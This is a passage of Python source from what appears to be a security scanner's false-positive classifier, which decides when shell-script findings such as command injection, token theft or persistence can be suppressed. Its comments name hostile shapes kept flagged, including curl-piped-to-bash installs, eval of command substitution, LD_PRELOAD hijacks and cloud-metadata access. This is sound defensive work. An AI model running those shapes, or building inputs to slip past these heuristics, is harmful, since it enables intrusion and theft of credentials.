    if rule_id == "CMD_INJECTION" and _match_inside_regex_arg_shell(line_text, match):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — CMD_INJECTION pattern fires
    # on common install-script command substitutions like ``$(uname -m)``,
    # ``$(cat "literal-path")``, ``$(curl "literal-URL")``, ``$(ls -A
    # "literal-path")`` where args are bare-literal / flag / literal-string.
    # No attacker-controlled input → no injection surface.
    if rule_id == "CMD_INJECTION" and _is_shell_literal_arg_cmdsub(line_text, match):
        return "safe_literal"

    # r* FP iter (2026-05-28) — generalised safe command-substitution.
    # ``$(cat "$PID_FILE")``, ``$(ls -A "$dir")``, ``$(curl ... | jq)``,
    # ``echo "$x" | perl -0777 -pe '...'`` are data reads / queries /
    # text-processing, not command injection. Genuine exec shapes
    # (``$(curl)|bash``, ``eval "$(...)"``, ``bash -c "$(...)"``,
    # ``$($CMD)``) are kept visible by the guards inside the helpers.
    if rule_id == "CMD_INJECTION" and _cmdsub_is_safe_data_command(line_text, match):
        return "safe_literal"
    if rule_id == "CMD_INJECTION" and _pipe_to_text_processor(line_text, match):
        return "safe_literal"

    # Issue #59 (2026-05-30) — live-sink-but-legitimate shapes. Each is a
    # high-certainty FP that reaches a real sink; the helpers default to KEEP
    # whenever certainty is unreachable, and the malicious counterpart of each
    # stays VISIBLE (two-sided tested).
    # A1 — Authorization: Bearer ${VAR} auth header (not credential exfil).
    if rule_id == "TOKEN_STEAL" and _is_bearer_auth_not_exfil(line_text):
        return "safe_literal"
    # A2 — |binary inside a case glob-alternation pattern list (not a pipe).
    if rule_id == "CMD_INJECTION" and _match_inside_case_pattern(lines, line_idx, match):
        return "safe_literal"
    # A3 — curl to a constant-host destination (not attacker-controlled SSRF).
    if rule_id == "SSRF_ADVANCED" and _curl_target_host_is_constant(lines, line_idx):
        return "safe_literal"
    # A4 — bounded double-requestAnimationFrame Promise-settle (not a loop).
    if rule_id == "RESOURCE_ABUSE" and _is_bounded_promise_double_raf(line_text):
        return "safe_literal"

    # Issue #61 — removing / unloading a launchd agent is the opposite of
    # establishing persistence; an install/load verb on the same line keeps it
    # visible.
    if rule_id == "PERSISTENCE" and _is_launchagent_removal(line_text):
        return "safe_literal"

    # Issue #63 — a persistence INSTALL whose launched daemon is
    # RESOLVABLE-in-tree, CLEAN, and NON-EXPLOITABLE is a documented opt-in
    # installer, not malware. The clear is COMPUTED from the launched code
    # (intrinsic), never a self-declaration. FAILS-SAFE: an unresolvable /
    # external / dirty / exploitable target → stays CRITICAL. The import is
    # lazy because cpv_persistence_target → scan_content → this classifier,
    # so a module-top import would be circular.
    if rule_id == "PERSISTENCE":
        try:
            from cpv_persistence_target import (  # type: ignore[import-not-found]
                persistence_launches_clean_inert_target,
            )
        except ImportError:
            persistence_launches_clean_inert_target = None  # type: ignore[assignment]
        if persistence_launches_clean_inert_target is not None and persistence_launches_clean_inert_target(
            line_text, file_path, _plugin_root_for(file_path), full_content=content
        ):
            return "safe_literal"

    # r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file.
    # (E) A bare Python raw-string literal line is a regex/pattern definition
    # (a security guard's own blocklist), not a shell command.
    if rule_id in _SHELL_EXECUTION_CLASS_RULES and _line_is_python_rawstring_pattern(line_text, match):
        return "safe_literal"
    # (F) ``subprocess.run(['git', ...])`` list-form runs argv directly with
    # no shell → no injection surface (``shell=True`` stays visible).
    if rule_id == "SHELL_EXEC" and _subprocess_call_is_list_form(lines, line_idx):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — Shell ``#`` comment line.
    # Execution-class rules (PRIVILEGE_ESC ``sudo``, FS_WRITE ``chmod NNN``,
    # CMD_INJECTION ``$(...)``) matched inside a full-line shell ``#``
    # comment are documentation prose, not invocation. Iron rule
    # preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL / etc.)
    # stay visible via the existing demote pipeline.
    if (
        _is_shell_comment_line(line_text)
        and rule_id in _SHELL_EXECUTION_CLASS_RULES
        # A leading ``#`` only opens a comment when the line STARTS outside a
        # string. With a double quote still open from an earlier line this is
        # string content, and a ``$(...)``/backtick in it executes — so the
        # finding stays visible. Only the provably-live ``dq`` case is
        # declined; ``sq`` (literal) and ``unknown`` (heredoc — unmodelled)
        # keep the historical verdict rather than guessing.
        and _shell_quote_state_at_line_start(lines, 0, line_idx) != "dq"
    ):
        return "safe_literal"

    # r10-final FP iter (2026-05-28) — Execution-class rule matched
    # INSIDE a quoted string passed to ``echo``/``printf``/``cat``.
    # ``echo "Install with: sudo apt install $pkg"`` is display text,
    # not invocation. The display string is shown to the user; no
    # actual ``sudo`` runs.
    if rule_id in _SHELL_EXECUTION_CLASS_RULES and _match_inside_shell_echo_string(line_text, match):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — FS_WRITE pattern bare-suffix
    # match (``.zshrc``, ``.bashrc``, ``.profile``) fires on READ checks
    # ``[ -f "$HOME/.zshrc" ]``, variable assignments ``shell_rc="$HOME/.zshrc"``,
    # and echo prose ``echo "No .zshrc found"`` — none are file writes.
    # Real writes need an explicit write-intent token (``>``, ``>>``,
    # ``tee``, ``cp`` …) within proximity.
    if rule_id == "FS_WRITE" and _shell_match_lacks_write_intent(line_text, match):
        return "safe_literal"

    # r10-final FP iter (2026-05-28) — OBFUSCATION pattern fires on
    # Nerd Font / Powerline icon byte sequences like
    # ``printf '\xee\x82\xb6'`` followed by ``# U+XXXX <icon-name>``
    # comment. These are statusline rendering primitives, not
    # obfuscation. The ``# U+`` codepoint comment is the unambiguous
    # disambiguator: legitimate icon definitions always carry it.
    if rule_id == "OBFUSCATION" and _is_nerd_font_icon_byte_sequence(lines, line_idx):
        return "safe_literal"

    # r10-final-blanket FP iter (2026-05-28) — blanket suppress
    # execution-class rules in shell TEST FILES (test-*.sh, *.test.sh,
    # in tests/ directory). Test scaffolding routinely uses curl, exec,
    # tmux, sleep, file writes, etc. for SUT setup. Iron rule preserved:
    # prose-vector rules (PROMPT_INJECT / DATA_EXFIL / INVISIBLE_UNICODE_RAW
    # / per-vendor SECRET_*) still fire.
    #
    # Security-audit red-team (G5-skillaudit-shell-test-file-blanket,
    # 2026-06-09): REVERSE_SHELL / CONTAINER_ESCAPE / PERSISTENCE /
    # PRIVILEGE_ESC / SUPPLY_CHAIN were removed from the blanket set (above),
    # and two carve-outs keep specific payloads VISIBLE even inside a test
    # file — an ENV_INJECTION hijack-var assignment (LD_PRELOAD / NODE_OPTIONS
    # / …) and an OBFUSCATION decode→exec shape (… | bash / eval). Test files
    # are EXECUTED at publish time, so those remain real threats.
    if _is_shell_test_file(file_path) and rule_id in _SHELL_TEST_BLANKET_SUPPRESS_RULES:
        if rule_id == "ENV_INJECTION" and _shell_line_is_hijack_var_injection(line_text):
            pass  # hijack-var injection in a test file → keep visible
        elif rule_id == "OBFUSCATION" and _shell_line_has_exec_sink(line_text):
            pass  # decode→exec in a test file → keep visible
        else:
            return "safe_literal"

    # r10-final FP iter (2026-05-28) — NET_SUSPICIOUS / CMD_INJECTION
    # / URL_RAW_IP / SSRF_PATTERN on loopback / RFC1918 private IP
    # literals (127.0.0.1:9222 Chrome DevTools, 192.168.x.x home
    # network, etc.). Loopback / private IPs cannot reach the public
    # internet. Iron rule preserved: cloud metadata endpoint
    # 169.254.169.254 stays visible (attacker-reachable from cloud VMs).
    #
    # Security-audit red-team (G5-skillaudit-shell-loopback-token-suppress,
    # 2026-06-09): SUPPLY_CHAIN was REMOVED from this set (the TS classifier
    # already excludes it) — a ``curl … | bash`` supply-chain install is not
    # rendered benign just because a loopback token appears on the same line.
    # And ``_line_has_loopback_or_private_ip_shell`` is now DESTINATION-scoped
    # (refuses to certify a line that also reaches a public host), so a
    # loopback token in a comment beside a public payload no longer suppresses.
    if rule_id in (
        "NET_SUSPICIOUS",
        "CMD_INJECTION",
        "URL_RAW_IP",
        "SSRF_PATTERN",
    ) and _line_has_loopback_or_private_ip_shell(line_text):
        return "safe_literal"

    if line_idx == 0:
        return ""
    # `_` underscores below used by intent — pylint-style noqa not needed.
    open_heredocs: list[tuple[str, bool]] = []  # (delimiter, is_quoted)
    for i in range(line_idx):
        line = lines[i]
        # If we're inside an open heredoc, ONLY check for the closer on
        # this line — non-closer lines inside a heredoc are body content,
        # never new openers (a heredoc body is data, not commands).
        if open_heredocs and line.strip() == open_heredocs[-1][0]:
            open_heredocs.pop()
            continue
        if open_heredocs:
            continue
        m = _PRINT_HEREDOC_OPEN_RE.match(line)
        if m:
            # group(1) is the (optional) quote around the delimiter: a quoted
            # delimiter (`<<'EOF'` / `<<"END"`) disables ALL expansion in the body.
            open_heredocs.append((m.group(2), bool(m.group(1))))
    if not open_heredocs:
        return ""

    # #83.5 — the match line is inside a PRINT heredoc body (printed text, not
    # run). For an EXECUTION-class rule the body is fully INERT — promote to
    # `safe_literal` (so it no longer blocks `--strict`) — when no command can
    # interpolate: a QUOTED delimiter disables all expansion, and an UNQUOTED
    # body line with no command substitution (`$(…)` / backticks) is literal
    # printed text. An UNQUOTED body line that DOES contain `$(…)`/backtick
    # interpolates and runs, so it stays demoted (`safe_doc`, visible for
    # review). NON-execution-class (prose-vector) rules keep the existing
    # `safe_doc` demote — printed prompt-injection / exfil text can still reach
    # an agent, so it must stay visible.
    if rule_id in _SHELL_EXECUTION_CLASS_RULES:
        if open_heredocs[-1][1]:  # quoted delimiter → zero interpolation
            return "safe_literal"
        if not _SHELL_CMD_SUBST_RE.search(line_text):
            return "safe_literal"  # unquoted body, literal printed text
        return "safe_doc"  # unquoted body + command substitution → interpolates
    return "safe_doc"
